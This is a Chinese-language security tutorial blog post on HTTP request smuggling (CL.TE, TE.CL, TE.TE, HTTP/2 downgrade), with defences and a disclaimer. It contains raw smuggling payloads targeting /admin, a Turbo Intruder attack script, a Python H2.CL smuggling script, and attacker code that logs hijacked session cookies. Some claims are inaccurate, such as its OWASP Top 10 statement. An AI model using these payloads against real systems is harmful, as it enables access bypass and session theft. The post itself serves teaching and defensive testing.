---
title: HTTP请求走私攻击
date: 2026-06-15 08:00:00
tags:
  - Web安全
  - 渗透测试
categories: 渗透测试
cover: https://portswigger.net/web-security/images/http-request-smuggling.svg
---

## 一、引言

HTTP请求走私（HTTP Request Smuggling）是一种利用HTTP协议解析差异的攻击技术，最早由Watchfire（后被IBM收购）的研究员在2005年提出。随着现代Web架构中普遍采用"前端代理/负载均衡 + 后端应用服务器"的多层部署模式，这一攻击手段在近年来越发受到安全社区的关注，连续多年入选OWASP Top 10。

其核心原理在于：当链路上的不同HTTP解析器对请求边界的理解不一致时，攻击者可以在一个"正常"请求中嵌入另一个"走私"请求，从而干扰后续用户的正常请求，实现缓存投毒、请求劫持、安全防护绕过等高危攻击。

```
┌─────────┐     ┌─────────────────┐     ┌─────────────────┐
│  客户端  │────▶│  前端（代理/CDN） │────▶│  后端（应用服务）  │
└─────────┘     └─────────────────┘     └─────────────────┘
                        ▲                        ▲
                        │       解析差异！       │
                        └────────────────────────┘
```

## 二、HTTP协议基础：Content-Length 与 Transfer-Encoding

在深入攻击原理之前，有必要回顾HTTP/1.1协议中两个关键的头部字段。

### 2.1 Content-Length（CL）

`Content-Length` 头指明请求体的字节长度。接收方读取恰好该长度的数据作为请求体，剩余数据视为下一个请求的开端。这是一个简单且确定的方式，符合RFC 7230规范。

```
POST /login HTTP/1.1
Host: example.com
Content-Length: 11

hello world
```

服务器读取 "hello world"（11字节）后，认为该请求已结束。

### 2.2 Transfer-Encoding（TE）

`Transfer-Encoding: chunked` 采用分块传输模式。请求体被拆分为若干块（chunk），每个块以十六进制的长度开头，后跟块数据，最终以 `0\r\n\r\n` 标识结束。

```
POST /upload HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

5\r\n
hello\r\n
6\r\n
 world\r\n
0\r\n
\r\n
```

请求体 "hello world" 被分两段传输，第一个块长0x5字节，第二个块长0x6字节。

### 2.3 歧义性的根源

RFC 7230第3.3.3节明确指出：**如果同时存在 Content-Length 和 Transfer-Encoding，必须优先使用 Transfer-Encoding**。然而现实中，不同实现的处理方式可能完全不同：

- **前端A**：严格遵守RFC，忽略Content-Length，按Transfer-Encoding解析。
- **后端B**：优先使用Content-Length，忽略Transfer-Encoding。
- **后端C**：同时读取两种头，可能导致混乱。

这种解析差异，正是HTTP请求走私攻击的温床。

## 三、三大经典攻击类型

根据前端和后端对不同头部的处理方式，HTTP请求走私可以分为以下三类。

### 3.1 CL.TE 走私

**场景**：前端使用 `Content-Length` 确定请求边界，后端使用 `Transfer-Encoding` 解析。

```
POST / HTTP/1.1
Host: vulnerable.example.com
Content-Length: 35
Transfer-Encoding: chunked

0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
\r\n
```

- **前端视角**：`Content-Length: 35` → 读取全部35字节，认为这是**一个**完整请求。
- **后端视角**：`Transfer-Encoding: chunked` → 遇到 `0\r\n\r\n` 后认为第一个请求结束；`GET /admin` 成为**第二个**被独立处理的请求。

攻击效果：攻击者成功向后端注入了 `GET /admin` 请求，而该请求不会被前端记录或审计。

### 3.2 TE.CL 走私

**场景**：前端使用 `Transfer-Encoding` 解析，后端使用 `Content-Length` 确定边界。

```
POST / HTTP/1.1
Host: vulnerable.example.com
Content-Length: 4
Transfer-Encoding: chunked

5c\r\n
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

- **前端视角**：`Transfer-Encoding: chunked` → 读取 `5c`（92字节）长的chunk，直到 `0\r\n\r\n`。这里 `5c` 是伪造的chunk长度标记，前端按分块协议读完。
- **后端视角**：`Content-Length: 4` → 仅读取4字节（即 "5c\r\n"），剩下的数据 `GET /admin ...` 会被作为下一个独立请求处理。

### 3.3 TE.TE 走私

**场景**：前后端都使用 `Transfer-Encoding`，但通过构造畸形的TE头让其中一方忽略它，从而退回到 `Content-Length` 模式。

常见的混淆手段包括：

```http
Transfer-Encoding: xchunked          # 无效值，被某些解析器忽略
Transfer-Encoding : chunked          # 冒号前的空格导致解析失败
Transfer-Encoding: chunked\r\n
Transfer-encoding: chunked           # 大小写变化
X: X\r\nTransfer-Encoding: chunked   # 前置无关头干扰
```

```
POST / HTTP/1.1
Host: vulnerable.example.com
Content-Length: 4
Transfer-Encoding: cow
Transfer-Encoding: chunked

5c\r\n
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
\r\n
0\r\n
\r\n
```

- **前端**：可能只认第一个 `Transfer-Encoding: cow`（无效值，降级为CL），也可能先读到一个有效值后遇到混淆头。
- **后端**：可能只识别最后一个 `Transfer-Encoding: chunked`，按分块传输解析。

依赖目标的具体实现，灵活调整混淆策略。

## 四、攻击流程图

下面以CL.TE走私为例，展示一次完整的攻击流程：

```
                     攻击者                           前端代理                         后端服务器
                       │                                │                                │
                       │  POST / HTTP/1.1               │                                │
                       │  Content-Length: 35            │                                │
                       │  TE: chunked                   │                                │
                       │                                │                                │
                       │  0\r\n                         │                                │
                       │  \r\n                          │                                │
                       │  GET /admin HTTP/1.1\r\n       │                                │
                       │  Host: evil\r\n                │                                │
                       │  \r\n                          │                                │
                       ├───────────────────────────────▶│                                │
                       │                                │                                │
                       │                                │  按CL读取35字节→一个完整请求     │
                       │                                ├───────────────────────────────▶│
                       │                                │                                │
                       │                                │                                │  按TE分块解析
                       │                                │                                │  遇到0\r\n\r\n→第一个请求结束
                       │                                │                                │  GET /admin →第二个请求！
                       │                                │                                ├─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─▶
                       │                                │                                │  处理/admin请求
                       │                                │                                │
                       │                 ◀──────────────┤                                │
                       │  200 OK (正常响应)              │  响应合并                       │
                       │  ← ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ │                                │
                       │                                │                                │
                       │  受害者                          │                                │
                       │  GET / HTTP/1.1                │                                │
                       │  Cookie: session=xxx           │                                │
                       ├───────────────────────────────▶│                                │
                       │                                │                                │
                       │                                │  附加到走私请求后                │
                       │                                ├───────────────────────────────▶│
                       │                                │                                │
                       │                                │                                │  受害者请求被当作/admin的参数
                       │                                │                                │  返回攻击者可控内容
```

## 五、实战利用场景

### 5.1 缓存投毒（Cache Poisoning）

最经典的利用方式。攻击者走私一个请求，使得CDN/代理缓存中将错误的内容与合法URL关联，后续所有请求该URL的用户都会收到投毒后的响应。

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 82
Transfer-Encoding: chunked

0\r\n
\r\n
GET /index.html HTTP/1.1\r\n
Host: attacker.com\r\n
X: GET /index.html HTTP/1.1\r\n
Host: attacker.com\r\n
\r\n
```

攻击成功后，CDN可能在缓存 `/index.html` 时使用了来自 `attacker.com` 的响应，所有访问首页的用户都会看到攻击者构造的页面。这可能被用于分发恶意JavaScript、钓鱼页面或篡改关键内容。

### 5.2 请求劫持（Request Hijacking）

走私攻击可以劫持后续正常用户的请求，将其重定向或窃取其敏感数据。

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 60
Transfer-Encoding: chunked

0\r\n
\r\n
GET /capture?data=
```

下一个用户的请求（包括其Cookie、Authorization头等）将被拼接到 `data=` 参数之后，攻击者可以在 `/capture` 端点记录所有被劫持的会话令牌。

```javascript
// 攻击者后端的伪代码逻辑
app.get('/capture', (req, res) => {
    // data参数中包含了受害者的完整HTTP请求头
    fs.appendFileSync('stolen_sessions.log', req.query.data + '\n---\n');
    res.send('ok');
});
```

### 5.3 WAF / 安全防护绕过

当WAF部署在代理层时，走私请求可以完全绕过安全检测。

```
攻击者发送的请求（经CDN/WAF检查）：
  POST /safe-endpoint HTTP/1.1
  Content-Length: XX
  TE: chunked
  0\r\n\r\n
  POST /admin/delete-user HTTP/1.1   ← WAF看不到这个请求！
  Host: internal
  ...

WAF视角：
  "这只是一个对/safe-endpoint的POST请求，没有问题，放行。"

后端视角：
  请求1: POST /safe-endpoint   → 正常处理
  请求2: POST /admin/delete-user → 绕过WAF，直接执行危险操作
```

典型的绕过场景包括：
- 访问内部管理接口（如 `/admin`、`/actuator`、`/.env`）
- 执行恶意文件上传，绕过扩展名校验
- 发送SQL注入/XSS payload，绕过WAF规则匹配
- SSRF攻击内网服务

## 六、Burp Suite 工具辅助

### 6.1 HTTP Request Smuggler 插件

PortSwigger官方发布的Burp Suite扩展——**HTTP Request Smuggler**，可以自动化检测和利用请求走私漏洞。

**主要功能**：

```
┌──────────────────────────────────────────────┐
│         HTTP Request Smuggler                │
├──────────────────────────────────────────────┤
│  [√] 自动检测 CL.TE / TE.CL / TE.TE 漏洞     │
│  [√] 异步超时技术（Turbo Intruder 集成）      │
│  [√] 一键生成POC验证请求                      │
│  [√] 支持HTTP/2降级走私检测                   │
│  [√] 请求队列污染探测                          │
└──────────────────────────────────────────────┘
```

**检测核心逻辑**：插件会发送如下探测请求：

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1\r\n
Z\r\n
Q\r\n
```

如果后端因解析到 `Q` 字符但期望新的请求行而超时或返回异常，则可判定存在走私漏洞。不同时间差异模式（time-based）对应不同的漏洞类型。

### 6.2 Turbo Intruder 高级利用

结合Burp Suite的Turbo Intruder，可以以极高的并发速率执行请求走私攻击，放大利用效果。以下是一个针对CL.TE漏洞的Turbo Intruder脚本示例：

```python
# Turbo Intruder script for CL.TE smuggling
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=True
    )

    # 构造走私请求
    prefix = (
        "POST / HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Length: 35\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        "X-Ignore: "
    ) % target.host

    engine.queue(prefix, gate='attack')
    engine.openGate('attack')

    # 发送大量后续请求，其中第一个会被拼接
    for i in range(20):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

## 七、HTTP/2 降级走私

### 7.1 为什么 HTTP/2 会带来新的走私风险

HTTP/2协议本身消除了HTTP/1.1中的请求走私问题——它使用二进制帧（binary framing）而非文本协议，不存在Content-Length和Transfer-Encoding的歧义。然而，现实世界中大量系统采用以下架构：

```
客户端 ──HTTP/2──▶ CDN/代理 ──HTTP/1.1──▶ 后端服务器
```

**降级（Downgrade）过程**：代理接收到HTTP/2请求后，将其转换为HTTP/1.1请求转发给后端。如果转换过程中引入了歧义，新的走私机会就产生了。

### 7.2 H2.CL 走私

攻击者利用HTTP/2请求中的 `content-length` 伪头部（pseudo-header），在降级到HTTP/1.1时操纵Content-Length值。

```python
import socket
import ssl
import h2.connection
import h2.events

def h2_cl_smuggle(target_host, target_port=443):
    """HTTP/2降级走私：H2.CL 攻击演示"""

    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])

    sock = socket.create_connection((target_host, target_port))
    tls_sock = ctx.wrap_socket(sock, server_hostname=target_host)

    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    tls_sock.sendall(conn.data_to_send())

    # 构造走私请求：HTTP/2 content-length头部被降级为HTTP/1.1头
    headers = [
        (':method', 'POST'),
        (':path', '/'),
        (':authority', target_host),
        ('content-length', '0'),         # HTTP/2中这是普通头部
        ('transfer-encoding', 'chunked'),
    ]

    conn.send_headers(1, headers, end_stream=False)

    # 降级后，后端的请求体变为：
    # GET /admin HTTP/1.1\r\n
    # Host: internal\r\n
    # \r\n
    poison = (
        b"GET /admin HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"\r\n"
    )
    conn.send_data(1, poison, end_stream=True)
    tls_sock.sendall(conn.data_to_send())

    print("[+] H2.CL smuggling payload sent")
```

**关键点**：在HTTP/2中，`content-length` 只是一个普通的头部（header），不是伪头部。但降级代理可能将其映射为HTTP/1.1的 `Content-Length` 头并优先使用，从而覆盖实际的请求体长度，造成走私。

### 7.3 H2.TE 走私

类似地，HTTP/2请求中的 `transfer-encoding` 头在降级时可能被注入到HTTP/1.1请求中。

```http
# HTTP/2 原始头部
:method: POST
:path: /
:authority: target.com
transfer-encoding: chunked

# 降级到HTTP/1.1后（代理添加了自己的CL）
POST / HTTP/1.1
Host: target.com
Content-Length: 50           ← 代理根据HTTP/2 DATA帧计算
Transfer-Encoding: chunked   ← 降级时保留了攻击者注入的头

0\r\n
\r\n
GET /smuggled HTTP/1.1\r\n
Host: internal\r\n
\r\n
```

## 八、防御措施

### 8.1 架构层面

- **端到端HTTP/2**：尽可能使用HTTP/2贯穿整个链路，避免降级转换。
- **后端也使用HTTP/2**：彻底消除协议转换带来的歧义。
- **统一解析器**：确保前后端使用相同的HTTP解析库，或在代理层完成解析后以内部格式传递。

### 8.2 配置层面

- **拒绝歧义请求**：配置前端代理在请求同时包含 `Content-Length` 和 `Transfer-Encoding` 时直接返回400。
- **规范化头部**：去除重复、畸形或无效的Transfer-Encoding头。
- **严格的RFC合规**：确保所有HTTP解析严格遵循RFC 7230-7235。

### 8.3 检测与监控

- **定期扫描**：使用Burp Suite Scanner、HTTP Request Smuggler等工具进行自动化检测。
- **流量监控**：关注异常请求模式，如同一连接上出现多个独立请求行。
- **WAF规则更新**：启用现代WAF中针对请求走私的检测规则。

## 九、总结

HTTP请求走私攻击是一个"古老但常新"的安全问题。尽管RFC标准早已明确，但工程实现中的妥协和兼容性设计让这些漏洞存在了二十余年，且在新协议（HTTP/2、HTTP/3）的引入过程中不断催生新的攻击面。

对于渗透测试工程师而言，理解并掌握请求走私技术是深入Web安全领域的必经之路。从经典的CL.TE/TE.CL到如今的HTTP/2降级走私，攻击手法在演进，但核心思想始终如一：**在系统的缝隙中寻找不一致，在协议的模糊处注入恶意**。

> **免责声明**：本文所述技术仅供安全研究、攻防演练和渗透测试授权范围内使用。未经授权的攻击行为违反《中华人民共和国网络安全法》及其他相关法律法规，作者不对任何滥用行为承担责任。请始终在获得明确书面授权的前提下进行安全测试。

---

*参考资料*  
- PortSwigger Research: [HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)  
- RFC 7230: Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing  
- James Kettle: [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)  
- OWASP: [HTTP Request Smuggling](https://owasp.org/www-community/attacks/HTTP_Request_Smuggling)
